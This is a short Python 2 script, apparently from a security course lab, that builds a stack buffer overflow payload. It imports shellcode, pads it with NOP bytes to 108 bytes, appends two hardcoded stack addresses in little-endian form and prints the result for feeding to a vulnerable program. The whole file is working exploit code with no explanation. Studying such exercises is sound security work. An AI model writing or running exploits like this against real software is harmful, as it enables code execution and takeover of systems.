import os, sys
from shellcode import shellcode
from struct import pack

buf = shellcode + '\x90'*(108 - len(shellcode))
buf += pack("<I", 0xbffea158) + pack("<I", 0xbffea0cc)
print buf
